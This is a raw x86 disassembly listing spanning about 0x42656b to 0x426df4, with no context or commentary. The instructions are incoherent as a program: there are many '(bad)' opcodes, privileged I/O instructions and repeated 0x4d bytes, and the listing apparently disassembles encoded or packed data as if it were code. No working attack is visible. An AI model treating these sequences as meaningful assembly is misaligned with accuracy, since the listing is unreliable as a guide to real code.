  42656b:	push   0xffffffc0
  42656d:	mov    ecx,0x4dda4f50
  426572:	dec    ebp
  426573:	dec    ebp
  426574:	mov    ecx,0x4d310150
  426579:	dec    ebp
  42657a:	dec    ebp
  42657b:	xor    BYTE PTR [ecx+edi*4+0x50],0x4f
  426580:	mov    cl,0x4d
  426582:	dec    ebp
  426583:	dec    ebp
  426584:	xor    BYTE PTR [edi-0x79],0x80
  426588:	lock xor cl,BYTE PTR [ecx]
  42658b:	inc    esi
  42658c:	std    
  42658d:	or     al,0xb2
  42658f:	mov    esi,0x87f0800c
  426594:	adc    BYTE PTR [edi-0x385893ce],0x4
  42659b:	aam    0x53
  42659d:	jl     0x4265f2
  42659f:	jb     0x426553
  4265a1:	mov    edx,0xc4fbff29
  4265a6:	xchg   edx,eax
  4265a7:	add    ebp,edx
  4265a9:	ja     0x426605
  4265ab:	mov    ecx,0x5c09a180
  4265b0:	sbb    DWORD PTR [ecx],ecx
  4265b2:	pop    esp
  4265b3:	jo     0x426608
  4265b5:	adc    DWORD PTR [edx-0x72c7163e],esp
  4265bb:	lea    esi,[esi+0x9bab207]
  4265c1:	(bad)  
  4265c2:	(bad)  
  4265c3:	adc    BYTE PTR [ecx+0x2f],al
  4265c6:	or     DWORD PTR ds:0xf0804d4d,0xfffffff9
  4265cd:	adc    BYTE PTR [edi-0x49b9f67a],0xc
  4265d4:	mov    dl,0x7
  4265d6:	or     al,0x80
  4265d8:	xchg   edi,eax
  4265d9:	stc    
  4265da:	adc    bh,0x86
  4265dd:	push   ebx
  4265de:	sub    dl,BYTE PTR [ebx+0xb]
  4265e1:	call   DWORD PTR [ecx-0x4e]
  4265e4:	clc    
  4265e5:	sub    esp,ebp
  4265e7:	mov    dl,0xed
  4265e9:	mov    ebp,DWORD PTR [edi-0x29]
  4265ec:	icebp  
  4265ed:	xor    BYTE PTR [edi-0x79],0x80
  4265f1:	lock xor cl,BYTE PTR [ecx]
  4265f4:	inc    esi
  4265f5:	std    
  4265f6:	or     al,0xb2
  4265f8:	mov    esi,0x87f0800c
  4265fd:	adc    BYTE PTR [edi+0x537c5332],0x72
  426604:	mov    dl,0xba
  426606:	sub    edi,edi
  426608:	sti    
  426609:	les    edx,FWORD PTR [edx-0x32882aff]
  42660f:	mov    ecx,0x5c09a180
  426614:	sbb    DWORD PTR [ecx],ecx
  426616:	pop    esp
  426617:	jo     0x42666c
  426619:	adc    DWORD PTR [edx-0x72c7163e],esp
  42661f:	lea    esi,[esi+0x9bab207]
  426625:	(bad)  
  426626:	(bad)  
  426627:	adc    BYTE PTR [ecx+0x2f],al
  42662a:	inc    ecx
  42662b:	or     eax,0xf0804d4d
  426630:	stc    
  426631:	adc    BYTE PTR [edi-0x49b9f67a],0xc
  426638:	mov    dl,0x7
  42663a:	or     al,0x80
  42663c:	xchg   edi,eax
  42663d:	stc    
  42663e:	adc    bh,0x86
  426641:	push   ebx
  426642:	sub    dl,BYTE PTR [ebx+0xb]
  426645:	call   DWORD PTR [ecx-0x4e]
  426648:	clc    
  426649:	sub    esp,ebp
  42664b:	mov    dl,0xed
  42664d:	mov    ecx,DWORD PTR [edi+edx*8-0x78887f0f]
  426654:	xor    al,0x32
  426657:	or     DWORD PTR [esi-0x3],eax
  42665a:	or     al,0xb2
  42665c:	mov    esi,0x87f0800c
  426661:	adc    BYTE PTR [edi+0x537c5332],0x72
  426668:	mov    dl,0xba
  42666a:	sub    edi,edi
  42666c:	sti    
  42666d:	les    esi,FWORD PTR [ebp+0x1]
  426670:	push   esi
  426671:	ja     0x4266e0
  426673:	dec    ebp
  426674:	dec    ebp
  426675:	dec    ebp
  426676:	mov    ecx,0x5c09a180
  42667b:	sbb    DWORD PTR [ecx],ecx
  42667d:	pop    esp
  42667e:	jo     0x4266d3
  426680:	adc    DWORD PTR [edx-0x72c7163e],esp
  426686:	lea    esi,[esi+0x9bab207]
  42668c:	(bad)  
  42668d:	(bad)  
  42668e:	adc    BYTE PTR [ecx+0x2f],al
  426691:	prefetchw BYTE PTR [ebp+0x4d]
  426695:	xor    al,0xf9
  426698:	adc    BYTE PTR [edi-0x49b9f67a],0xc
  42669f:	mov    dl,0x7
  4266a1:	or     al,0x80
  4266a3:	xchg   edi,eax
  4266a4:	stc    
  4266a5:	adc    bh,0x86
  4266a8:	push   ebx
  4266a9:	sub    dl,BYTE PTR [ebx+0xb]
  4266ac:	call   DWORD PTR [ecx-0x4e]
  4266af:	clc    
  4266b0:	sub    esp,ebp
  4266b2:	mov    dl,0xed
  4266b4:	mov    ebp,edi
  4266b6:	xlat   BYTE PTR ds:[ebx]
  4266b7:	pop    esp
  4266b8:	add    DWORD PTR [edi-0x7],ecx
  4266bb:	or     eax,0x77504d4d
  4266c0:	mov    eax,DWORD PTR [eax+0x49608b77]
  4266c6:	cmp    eax,0xef50d146
  4266cb:	icebp  
  4266cc:	outs   dx,BYTE PTR ds:[esi]
  4266cd:	sub    ecx,DWORD PTR [ebx]
  4266cf:	sub    BYTE PTR [eax+0xa],dl
  4266d2:	out    dx,al
  4266d3:	or     BYTE PTR [edi-0x7],0xd
  4266d7:	dec    ebp
  4266d8:	dec    ebp
  4266d9:	sbb    BYTE PTR [eax-0x7a],0xd
  4266dd:	dec    ebp
  4266de:	dec    ebp
  4266df:	push   eax
  4266e0:	xlat   BYTE PTR ds:[ebx]
  4266e1:	xchg   dl,bh
  4266e3:	and    ah,BYTE PTR [edi+ebp*2]
  4266e6:	cmp    BYTE PTR [ebx-0x4e],ah
  4266e9:	or     DWORD PTR [edi-0x2a],ecx
  4266ec:	cmp    cl,BYTE PTR [ebp-0x7968a073]
  4266f2:	or     DWORD PTR [edi+0x6e],ecx
  4266f5:	cmp    cl,BYTE PTR [ebp+0x38305e8d]
  4266fb:	lea    ecx,[ebp-0x74b0af47]
  426701:	or     eax,0x74804d4d
  426706:	mov    ecx,0xd854f50
  42670b:	dec    ebp
  42670c:	dec    ebp
  42670d:	pop    esi
  42670e:	daa    
  42670f:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  426715:	mov    cl,BYTE PTR ds:0x2c5e4d4d
  42671b:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  426721:	or     eax,0x5e4d4d0d
  426726:	pop    ds
  426727:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  42672d:	lea    ecx,[ebp+0x4d]
  426730:	dec    ebp
  426731:	in     eax,dx
  426732:	push   0xffffffe8
  426734:	cmp    ch,0xb9
  426737:	push   eax
  426738:	add    DWORD PTR [ecx*2+0x77804d4d],ecx
  42673f:	jno    0x4267a1
  426741:	jae    0x42677b
  426743:	lea    ecx,[ebp-0x11feaf47]
  426749:	dec    ebp
  42674a:	dec    ebp
  42674b:	dec    ebp
  42674c:	in     eax,dx
  42674d:	mov    dl,0xaa
  42674f:	mov    ecx,0x4d6f0150
  426754:	dec    ebp
  426755:	dec    ebp
  426756:	pusha  
  426757:	push   edi
  426758:	cmp    BYTE PTR [ebp+0x150b98d],cl
  42675e:	out    dx,eax
  42675f:	dec    ebp
  426760:	dec    ebp
  426761:	dec    ebp
  426762:	in     eax,dx
  426763:	mov    dl,0x9d
  426765:	mov    ecx,0x4da60150
  42676a:	dec    ebp
  42676b:	dec    ebp
  42676c:	adc    BYTE PTR [ecx],0xb9
  42676f:	push   eax
  426770:	add    DWORD PTR [ecx],esp
  426772:	dec    ebp
  426773:	dec    ebp
  426774:	dec    ebp
  426775:	pusha  
  426776:	in     eax,dx
  426777:	cmp    BYTE PTR [ebp+0x150b98d],cl
  42677d:	mov    eax,ds:0x534d4d4d
  426782:	cld    
  426783:	pusha  
  426784:	xor    ch,BYTE PTR [esi-0x73]
  426787:	lea    edi,[ecx+0x4d710150]
  42678d:	dec    ebp
  42678e:	dec    ebp
  42678f:	mov    dl,0x86
  426791:	or     al,0x60
  426793:	sbb    ebx,DWORD PTR [eax]
  426795:	lea    ecx,[ebp-0x6ffeaf47]
  42679b:	dec    ebp
  42679c:	dec    ebp
  42679d:	dec    ebp
  42679e:	pusha  
  42679f:	fwait
  4267a0:	xchg   BYTE PTR [ebp+0x150b98d],cl
  4267a6:	adc    eax,0x804d4d4d
  4267ab:	lock jno 0x42679b
  4267ae:	add    eax,0x29bab20d
  4267b3:	push   DWORD PTR [edx+0xd164f50]
  4267b9:	dec    ebp
  4267ba:	dec    ebp
  4267bb:	xor    BYTE PTR [edi+0x21],0x80
  4267bf:	lock and DWORD PTR [ebx-0x4],edx
  4267c3:	mov    dl,0x86
  4267c5:	or     al,0xed
  4267c7:	add    eax,0x29bab20d
  4267cc:	push   DWORD PTR [edx+0x1e4f0f7c]
  4267d2:	or     eax,0x4d4d4d4d
  4267d7:	lea    ecx,[ebp+0xd164f01]
  4267dd:	dec    ebp
  4267de:	dec    ebp
  4267df:	or     al,BYTE PTR [eax-0xf7f8e89]
  4267e5:	jno    0x42683a
  4267e7:	cld    
  4267e8:	mov    dl,0x86
  4267ea:	or     al,0xed
  4267ec:	add    eax,0x29bab20d
  4267f1:	push   DWORD PTR [edx-0x74b0fef6]
  4267f7:	or     eax,0x800a4d4d
  4267fc:	ja     0x4267c6
  4267fe:	or     ch,0x3e
  426801:	cmp    cl,BYTE PTR [ebp+0x194f7c8d]
  426807:	dec    ebp
  426808:	dec    ebp
  426809:	dec    ebp
  42680a:	sar    ch,cl
  42680c:	sbb    al,0x38
  42680e:	dec    ebp
  42680f:	add    DWORD PTR [eax-0x8b2ea89],0x808b7750
  426819:	ja     0x4267a6
  42681b:	dec    edi
  42681c:	push   0xffffffd5
  42681e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42681f:	mov    ds:0x1d4c6957,al
  426824:	in     eax,dx
  426825:	fstp   st(0)
  426827:	mov    esp,0x21f08076
  42682c:	adc    BYTE PTR [edi+0x530de221],0x51
  426833:	popf   
  426834:	push   ebx
  426835:	div    DWORD PTR [edx-0x414dd608]
  42683b:	or     al,0xff
  42683d:	inc    BYTE PTR [eax-0x2e7f3769]
  426843:	cmp    cl,BYTE PTR es:[ebp+0x9a65f8d]
  42684a:	dec    edi
  42684b:	push   0x808d8d2f
  426850:	lock and DWORD PTR [eax+0x51532197],eax
  426857:	mov    dl,0xbe
  426859:	or     al,0x53
  42685b:	div    DWORD PTR [edx-0x100d608]
  426861:	adc    BYTE PTR [edi-0x1a2e7f38],0x3a
  426868:	lea    ecx,[ebp-0xf7f59b0]
  42686e:	and    DWORD PTR [eax+0x51532197],eax
  426874:	mov    dl,0xbe
  426876:	or     al,0x53
  426878:	div    DWORD PTR [edx-0x100d608]
  42687e:	adc    BYTE PTR [edi-0x322e7f38],0x3a
  426885:	lea    ecx,[ebp+0x6760a650]
  42688b:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426891:	and    eax,0x804d4d4d
  426896:	adc    DWORD PTR [ecx+0x4d290150],edi
  42689c:	dec    ebp
  42689d:	dec    ebp
  42689e:	pusha  
  42689f:	daa    
  4268a0:	cmp    BYTE PTR [ebp+0x150b98d],cl
  4268a6:	sub    eax,0x604d4d4d
  4268ab:	sub    BYTE PTR [eax],bh
  4268ad:	lea    ecx,[ebp-0x3ffeaf47]
  4268b3:	dec    ebp
  4268b4:	dec    ebp
  4268b5:	dec    ebp
  4268b6:	in     eax,dx
  4268b7:	mov    dl,0x4
  4268b9:	mov    ecx,0x4d350150
  4268be:	dec    ebp
  4268bf:	dec    ebp
  4268c0:	pusha  
  4268c1:	adc    al,0x38
  4268c3:	lea    ecx,[ebp+0x390150b9]
  4268c9:	dec    ebp
  4268ca:	dec    ebp
  4268cb:	dec    ebp
  4268cc:	in     eax,dx
  4268cd:	mov    dl,0xf3
  4268cf:	mov    ecx,0x4d3d0150
  4268d4:	dec    ebp
  4268d5:	dec    ebp
  4268d6:	pusha  
  4268d7:	sbb    al,0x38
  4268d9:	lea    ecx,[ebp-0x2dfeaf47]
  4268df:	dec    ebp
  4268e0:	dec    ebp
  4268e1:	dec    ebp
  4268e2:	adc    BYTE PTR [ecx],0xb9
  4268e5:	push   eax
  4268e6:	add    DWORD PTR [ebp+0x4d],eax
  4268e9:	dec    ebp
  4268ea:	dec    ebp
  4268eb:	pusha  
  4268ec:	sbb    BYTE PTR [eax],bh
  4268ee:	lea    ecx,[ebp+0x490150b9]
  4268f4:	dec    ebp
  4268f5:	dec    ebp
  4268f6:	dec    ebp
  4268f7:	pusha  
  4268f8:	daa    
  4268f9:	pop    ebp
  4268fa:	lea    ecx,[ebp-0x7efeaf47]
  426900:	dec    ebp
  426901:	dec    ebp
  426902:	dec    ebp
  426903:	pusha  
  426904:	push   ebx
  426905:	xor    ecx,DWORD PTR [ebp+0x150b98d]
  42690b:	aam    0x4d
  42690d:	dec    ebp
  42690e:	dec    ebp
  42690f:	cld    
  426910:	ja     0x426895
  426912:	mov    ds:0x8d185d60,eax
  426917:	lea    edi,[ecx+0x4d550150]
  42691d:	dec    ebp
  42691e:	dec    ebp
  42691f:	in     eax,dx
  426920:	mov    dl,0x5d
  426922:	mov    ecx,0x4d590150
  426927:	dec    ebp
  426928:	dec    ebp
  426929:	cld    
  42692a:	ja     0x4268d4
  42692c:	or     bh,ah
  42692e:	ja     0x426934
  426930:	xchg   ebp,eax
  426931:	cld    
  426932:	ja     0x4268e0
  426934:	stos   DWORD PTR es:[edi],eax
  426935:	pusha  
  426936:	(bad)  
  426938:	lea    ecx,[ebp+0x5d0150b9]
  42693e:	dec    ebp
  42693f:	dec    ebp
  426940:	dec    ebp
  426941:	cld    
  426942:	ja     0x4268c8
  426944:	jg     0x4269a6
  426946:	fistp  DWORD PTR [eax-0x73]
  426949:	lea    edi,[ecx+0x4dd60150]
  42694f:	dec    ebp
  426950:	dec    ebp
  426951:	cld    
  426952:	ja     0x42690e
  426954:	popf   
  426955:	cld    
  426956:	ja     0x426950
  426958:	xchg   esi,eax
  426959:	pusha  
  42695a:	inc    edx
  42695b:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426961:	gs dec ebp
  426963:	dec    ebp
  426964:	dec    ebp
  426965:	cld    
  426966:	ja     0x42691c
  426968:	xchg   BYTE PTR [eax-0x687f8e10],al
  42696e:	jno    0x4269c3
  426970:	push   ecx
  426971:	push   ebx
  426972:	div    DWORD PTR [edx-0x74df342]
  426978:	sub    edi,edi
  42697a:	inc    ah
  42697c:	fwait
  42697d:	adc    BYTE PTR [edi+0x71e78071],0x53
  426984:	jle    0x426938
  426986:	pop    es
  426987:	or     al,0x53
  426989:	mov    esi,DWORD PTR [edx-0x6300d644]
  42698f:	inc    ebx
  426990:	dec    BYTE PTR [ecx]
  426992:	loopne 0x4269c5
  426994:	iret   
  426995:	add    DWORD PTR [eax-0x187f8e69],0x71
  42699c:	push   ebx
  42699d:	jle    0x426951
  42699f:	pop    es
  4269a0:	or     al,0x53
  4269a2:	mov    esi,DWORD PTR [edx-0x6300d644]
  4269a8:	and    bh,0x8b
  4269ab:	mov    ds:0x8d8dcd05,al
  4269b0:	lea    esp,[edx-0x7272e14e]
  4269b6:	lea    eax,[ebx-0x7b]
  4269b9:	adc    BYTE PTR [ecx],dh
  4269bb:	add    DWORD PTR [bx+si+0x7197],0xffffff80
  4269c1:	lock jno 0x426a17
  4269c4:	jle    0x426a19
  4269c6:	std    
  4269c7:	mov    dl,0xba
  4269c9:	sub    DWORD PTR [edx-0x4900f3f9],esi
  4269cf:	xor    al,0x8b
  4269d2:	in     al,dx
  4269d3:	inc    BYTE PTR [eax-0x187f8e69]
  4269d9:	jno    0x426a2e
  4269db:	jle    0x426a30
  4269dd:	mov    esi,DWORD PTR [edx-0x434df3f9]
  4269e3:	sub    edi,edi
  4269e5:	pushf  
  4269e6:	in     eax,dx
  4269e7:	sti    
  4269e8:	out    dx,eax
  4269e9:	push   eax
  4269ea:	lock mov esp,DWORD PTR [ebx-0x2]
  4269ee:	in     al,0x1
  4269f0:	xor    al,0x71
  4269f3:	adc    BYTE PTR [edi+0x53515371],0xf7
  4269fa:	mov    dl,0xbe
  4269fc:	or     al,0xb2
  4269fe:	clc    
  4269ff:	sub    edi,edi
  426a01:	(bad)  
  426a02:	push   eax
  426a03:	add    DWORD PTR [esi],edx
  426a05:	or     eax,0xf0804d4d
  426a0a:	and    DWORD PTR [eax+0x51532197],eax
  426a10:	push   ebx
  426a11:	div    DWORD PTR [edx-0x414dd608]
  426a17:	or     al,0xff
  426a19:	inc    BYTE PTR [ecx]
  426a1b:	xchg   edi,eax
  426a1c:	adc    DWORD PTR [eax+0x16],0x1
  426a20:	push   ds
  426a21:	or     eax,0xb3f14d4d
  426a26:	cmp    BYTE PTR [ebp-0x46017f73],cl
  426a2c:	push   eax
  426a2d:	lock es in eax,dx
  426a30:	mov    dl,0xfb
  426a32:	or     bl,0xb9
  426a35:	push   eax
  426a36:	out    0xf2,eax
  426a38:	add    esi,esp
  426a3a:	add    al,0xb9
  426a3c:	push   eax
  426a3d:	out    0x2e,eax
  426a3f:	in     eax,dx
  426a40:	jl     0x426a30
  426a42:	mov    ecx,0x1f3e750
  426a47:	out    0x15,al
  426a49:	mov    ecx,0xed36e750
  426a4e:	jl     0x426a53
  426a50:	mov    ecx,0x80f4e750
  426a55:	retf   
  426a56:	mov    ecx,0x803ee750
  426a5b:	test   DWORD PTR [ecx-0x7f0a18b0],edi
  426a61:	push   es
  426a62:	mov    ecx,0x8046e750
  426a67:	test   DWORD PTR [ecx-0x7f9d18b0],edi
  426a6d:	retf   
  426a6e:	mov    ecx,0x1dee750
  426a73:	out    0xf2,al
  426a75:	mov    ecx,0xed56e750
  426a7a:	jl     0x426a6a
  426a7c:	mov    ecx,0x1e0e750
  426a81:	out    0x7a,al
  426a83:	mov    ecx,0xed5ee750
  426a88:	jl     0x426a8d
  426a8a:	mov    ecx,0xb9f1e750
  426a8f:	push   eax
  426a90:	lock mov cx,0x9750
  426a95:	cli    
  426a96:	adc    BYTE PTR [ecx],0xb9
  426a99:	push   eax
  426a9a:	lock push 0xffffff80
  426a9d:	lock and DWORD PTR [eax-0x8acde69],eax
  426aa4:	push   ebx
  426aa5:	push   ecx
  426aa6:	mov    dl,0xf8
  426aa8:	sub    DWORD PTR [edx-0x100f342],esi
  426aae:	adc    BYTE PTR [edi+0x21e78021],0x53
  426ab5:	jle    0x426a69
  426ab7:	pop    es
  426ab8:	or     al,0x1
  426aba:	xor    eax,esi
  426abc:	bound  edx,QWORD PTR [ebx-0x75]
  426abf:	mov    dl,0xbc
  426ac1:	sub    edi,edi
  426ac3:	pushf  
  426ac4:	or     DWORD PTR [edi+ebx*2+0x53],ebx
  426ac8:	pushf  
  426ac9:	mov    ecx,0xf0800e50
  426ace:	and    DWORD PTR [eax+0x51532197],eax
  426ad4:	push   ebx
  426ad5:	div    DWORD PTR [edx-0x74df342]
  426adb:	sub    edi,edi
  426add:	inc    BYTE PTR [eax+0x31012197]
  426ae3:	lock es push ebx
  426ae6:	jle    0x426a68
  426ae8:	out    0x21,eax
  426aea:	mov    dl,0x7
  426aec:	or     al,0x53
  426aee:	mov    esi,DWORD PTR [edx-0x6300d644]
  426af4:	or     DWORD PTR [edi+ebx*2+0x53],ebx
  426af8:	pushf  
  426af9:	mov    ecx,0xf0800e50
  426afe:	and    DWORD PTR [eax-0x8acde69],eax
  426b04:	mov    dl,0xf8
  426b06:	sub    DWORD PTR [ebx+0x51],edx
  426b09:	mov    dl,0xbe
  426b0b:	or     al,0xff
  426b0d:	inc    BYTE PTR [eax-0x187fde69]
  426b13:	and    DWORD PTR [ebx+0x7e],edx
  426b16:	mov    dl,0x7
  426b18:	or     al,0x53
  426b1a:	mov    esi,DWORD PTR [edx-0x6300d644]
  426b20:	mov    ecx,0x52974150
  426b25:	or     eax,0xf0804d4d
  426b2a:	and    DWORD PTR [eax-0x8acde69],eax
  426b30:	mov    dl,0xf8
  426b32:	sub    DWORD PTR [ebx+0x51],edx
  426b35:	mov    dl,0xbe
  426b37:	or     al,0xff
  426b39:	inc    BYTE PTR [eax-0x187fde69]
  426b3f:	and    DWORD PTR [ebx+0x7e],edx
  426b42:	mov    dl,0x7
  426b44:	or     al,0x53
  426b46:	mov    esi,DWORD PTR [edx-0x6300d644]
  426b4c:	mov    ecx,0xa5974150
  426b51:	or     eax,0xf0804d4d
  426b56:	jno    0x426ad8
  426b58:	xchg   edi,eax
  426b59:	jno    0x426bae
  426b5b:	not    DWORD PTR [ebx+0x51]
  426b5e:	mov    dl,0xf8
  426b60:	sub    DWORD PTR [edx-0x100f342],esi
  426b66:	adc    BYTE PTR [edi+0x71e78071],0x53
  426b6d:	jle    0x426bc2
  426b6f:	mov    esi,DWORD PTR [edx-0x434df3f9]
  426b75:	sub    edi,edi
  426b77:	pushf  
  426b78:	in     al,dx
  426b79:	(bad)  
  426b7a:	push   eax
  426b7b:	add    DWORD PTR [esi],edx
  426b7d:	or     eax,0xf0804d4d
  426b82:	and    DWORD PTR [eax-0x187fde69],eax
  426b88:	out    dx,eax
  426b89:	push   ebx
  426b8a:	not    DWORD PTR [ebx+0x51]
  426b8d:	mov    dl,0xbe
  426b8f:	or     al,0xb2
  426b91:	clc    
  426b92:	sub    edi,edi
  426b94:	inc    BYTE PTR [ecx]
  426b96:	dec    edi
  426b97:	push   edx
  426b98:	or     eax,0xf504d4d
  426b9d:	add    DWORD PTR [esi],ebx
  426b9f:	or     eax,0x77014d4d
  426ba4:	bound  eax,QWORD PTR [esi+0x4d4d61d3]
  426baa:	xor    al,0x71
  426bad:	adc    BYTE PTR [edi+0x530de271],0x51
  426bb4:	stos   DWORD PTR es:[edi],eax
  426bb5:	push   ebx
  426bb6:	pushf  
  426bb7:	mov    dl,0xbe
  426bb9:	or     al,0xb2
  426bbb:	clc    
  426bbc:	sub    edi,edi
  426bbe:	(bad)  
  426bbf:	push   eax
  426bc0:	lidtd  [esi]
  426bc3:	or     eax,0x77804d4d
  426bc8:	and    DWORD PTR [eax-0x3acde10],eax
  426bce:	mov    dl,0x86
  426bd0:	or     al,0x53
  426bd2:	sub    dh,BYTE PTR [edx-0x4d00d646]
  426bd8:	aad    0x3d
  426bda:	add    DWORD PTR [edi+0x16],ecx
  426bdd:	or     eax,0x800a4d4d
  426be2:	ja     0x426c55
  426be4:	xor    al,0x71
  426be7:	push   ebx
  426be8:	cld    
  426be9:	mov    dl,0x86
  426beb:	or     al,0x53
  426bed:	sub    dh,BYTE PTR [edx-0x4d00d646]
  426bf3:	or     al,BYTE PTR [ecx]
  426bf5:	dec    edi
  426bf6:	and    eax,0xa4d4d4d
  426bfb:	xor    BYTE PTR [edi+0x15],0xe2
  426bff:	lea    ecx,[ebp-0x9]
  426c02:	xor    BYTE PTR [edi+0x21],0x80
  426c06:	lock and DWORD PTR [ebx-0x4],edx
  426c0a:	push   ebx
  426c0b:	sub    al,BYTE PTR [eax-0x794d1019]
  426c11:	or     al,0xb2
  426c13:	mov    edx,0x1b2ff29
  426c18:	add    DWORD PTR [ebp+0x504d4d0d],esp
  426c1e:	inc    ecx
  426c1f:	dec    edi
  426c20:	push   ds
  426c21:	or     eax,0x77014d4d
  426c26:	xchg   BYTE PTR es:0x804d4d88,al
  426c2d:	lock jno 0x426bb0
  426c30:	xchg   edi,eax
  426c31:	jno    0x426c86
  426c33:	push   ecx
  426c34:	mov    dl,0xbe
  426c36:	or     al,0xed
  426c38:	ret    0xb20d
  426c3b:	clc    
  426c3c:	sub    edi,edi
  426c3e:	(bad)  
  426c3f:	push   eax
  426c40:	lidtd  [esi]
  426c43:	or     eax,0x33f14d4d
  426c48:	cmp    BYTE PTR [ebp+0x386b5e8d],cl
  426c4e:	lea    ecx,[ebp+0xa4f50b9]
  426c54:	dec    ebp
  426c55:	dec    ebp
  426c56:	dec    ebp
  426c57:	add    edx,ebx
  426c59:	jno    0x426c14
  426c5b:	push   eax
  426c5c:	add    DWORD PTR [ebp+0x5e4d4d4d],esi
  426c62:	popa   
  426c63:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  426c69:	stos   BYTE PTR es:[edi],al
  426c6a:	dec    ebp
  426c6b:	dec    ebp
  426c6c:	dec    ebp
  426c6d:	cmp    bl,0xb9
  426c70:	push   eax
  426c71:	dec    edi
  426c72:	xchg   ebp,eax
  426c73:	dec    ebp
  426c74:	dec    ebp
  426c75:	dec    ebp
  426c76:	xor    BYTE PTR [edx-0x66b0af47],0x4d
  426c7d:	dec    ebp
  426c7e:	dec    ebp
  426c7f:	in     eax,dx
  426c80:	push   0x29
  426c82:	cmp    ch,0xb9
  426c85:	push   eax
  426c86:	add    DWORD PTR [ecx+0x14d4d4d],edi
  426c8c:	fisubr DWORD PTR [ecx]
  426c8e:	mov    ecx,0x4dbd0150
  426c93:	dec    ebp
  426c94:	dec    ebp
  426c95:	in     eax,dx
  426c96:	mov    dl,0xd6
  426c98:	mov    ecx,0x4de20150
  426c9d:	dec    ebp
  426c9e:	dec    ebp
  426c9f:	add    edx,ebx
  426ca1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ca2:	mov    ecx,0x4dc50150
  426ca7:	dec    ebp
  426ca8:	dec    ebp
  426ca9:	or     BYTE PTR [ebx-0x6297af47],0x4d
  426cb0:	dec    ebp
  426cb1:	dec    ebp
  426cb2:	add    esi,esp
  426cb4:	scas   al,BYTE PTR es:[edi]
  426cb5:	pusha  
  426cb6:	dec    ebp
  426cb7:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426cbd:	ror    DWORD PTR [ebp+0x4d],0x4d
  426cc1:	add    edx,ebx
  426cc3:	or     eax,0x520150b9
  426cc8:	dec    ebp
  426cc9:	dec    ebp
  426cca:	dec    ebp
  426ccb:	mov    ecx,0x4dae6850
  426cd0:	dec    ebp
  426cd1:	dec    ebp
  426cd2:	in     eax,dx
  426cd3:	jl     0x426c60
  426cd5:	mov    ecx,0x4da56850
  426cda:	dec    ebp
  426cdb:	dec    ebp
  426cdc:	or     BYTE PTR [ebx-0x72c783a0],0x8d
  426ce3:	mov    ecx,0x4de40150
  426ce8:	dec    ebp
  426ce9:	dec    ebp
  426cea:	cmp    ch,0xb9
  426ced:	push   eax
  426cee:	add    ebp,edx
  426cf0:	dec    ebp
  426cf1:	dec    ebp
  426cf2:	dec    ebp
  426cf3:	xor    BYTE PTR [ecx+edi*4+0x50],0x4f
  426cf8:	out    0x4d,al
  426cfa:	dec    ebp
  426cfb:	dec    ebp
  426cfc:	push   ebx
  426cfd:	push   0xffffffb9
  426cff:	push   eax
  426d00:	push   0x4d4d4da9
  426d05:	add    DWORD PTR [eax-0x1b],ebp
  426d08:	dec    ebp
  426d09:	dec    ebp
  426d0a:	dec    ebp
  426d0b:	jl     0x426d5c
  426d0d:	lods   eax,DWORD PTR ds:[esi]
  426d0e:	dec    ebp
  426d0f:	dec    ebp
  426d10:	dec    ebp
  426d11:	out    0x38,eax
  426d13:	xor    edi,DWORD PTR [eax]
  426d15:	jl     0x426d66
  426d17:	(bad)  [ebp+0x4d]
  426d1a:	dec    ebp
  426d1b:	ret    
  426d1c:	cmp    BYTE PTR [esi-0x7fbb46c8],dl
  426d22:	ja     0x426d95
  426d24:	xor    al,0x71
  426d27:	adc    BYTE PTR [edi+0xd05ed71],0xb2
  426d2e:	mov    edx,0xb2fc5329
  426d33:	xchg   BYTE PTR [edi+edi*8],cl
  426d36:	mov    dl,0x80
  426d38:	lock jno 0x426d28
  426d3b:	add    eax,0xb27e530d
  426d40:	mov    edx,0xc07b229
  426d45:	push   DWORD PTR [esi-0x4128fad]
  426d4b:	sbb    edx,DWORD PTR [ebx]
  426d4d:	jo     0x426da2
  426d4f:	dec    ebp
  426d50:	arpl   bx,cx
  426d52:	or     esi,ecx
  426d54:	and    cl,BYTE PTR [ebp-0x101b7273]
  426d5a:	arpl   bx,di
  426d5c:	or     ebp,ebp
  426d5e:	cmp    BYTE PTR [ebp-0xf7f7273],cl
  426d64:	jno    0x426ce6
  426d66:	xchg   edi,eax
  426d67:	jno    0x426dbc
  426d69:	push   ecx
  426d6a:	mov    dl,0xbe
  426d6c:	or     al,0xed
  426d6e:	ret    0xb20d
  426d71:	clc    
  426d72:	sub    edi,edi
  426d74:	(bad)  
  426d75:	in     al,dx
  426d76:	std    
  426d77:	adc    BYTE PTR [ecx+edi*4+0xaf01653],0x4d
  426d7f:	dec    ebp
  426d80:	dec    ebp
  426d81:	xor    al,0x71
  426d84:	and    bh,0x71
  426d87:	push   ebx
  426d88:	push   ecx
  426d89:	mov    dl,0xbe
  426d8b:	or     al,0xed
  426d8d:	dec    ebx
  426d8e:	or     eax,0xff29bcb2
  426d93:	sub    ch,ah
  426d95:	std    
  426d96:	mov    ecx,0xaf04180
  426d9b:	dec    ebp
  426d9c:	dec    ebp
  426d9d:	dec    ebp
  426d9e:	mov    ecx,0xb2b9b64b
  426da3:	mov    edx,0x7b6b909
  426da8:	mov    ecx,0xf080b6ff
  426dad:	jno    0x426d2f
  426daf:	out    0x71,eax
  426db1:	push   ebx
  426db2:	push   ecx
  426db3:	mov    dl,0xbe
  426db5:	or     al,0xed
  426db7:	dec    ebx
  426db8:	or     eax,0xff29bcb2
  426dbd:	sub    ch,ah
  426dbf:	std    
  426dc0:	mov    ecx,0xaf01650
  426dc5:	dec    ebp
  426dc6:	dec    ebp
  426dc7:	dec    ebp
  426dc8:	xor    al,0x71
  426dcb:	adc    BYTE PTR [edi-0x12aeac8f],0xc2
  426dd2:	or     eax,0xb20cbeb2
  426dd7:	clc    
  426dd8:	sub    edi,edi
  426dda:	inc    BYTE PTR [eax-0x4d138e69]
  426de0:	xor    al,0x71
  426de3:	in     eax,dx
  426de4:	add    eax,0xb27e530d
  426de9:	mov    edx,0xc07b229
  426dee:	push   DWORD PTR [esi-0x4128fad]
  426df4:	sbb    edx,DWORD PTR [ebx]
